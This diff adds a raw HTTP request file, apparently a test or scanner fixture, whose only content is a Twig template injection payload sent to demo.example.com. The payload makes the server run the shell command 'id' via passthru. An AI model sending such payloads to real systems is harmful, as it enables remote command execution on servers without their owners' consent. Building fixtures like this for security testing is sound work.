@@ -1,0 +1,4 @@
+GET /a?data={{%20dump()%20}}{{%20[%26%2339;id%26%2339;]|map(%26%2339;passthru%26%2339;)%20}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
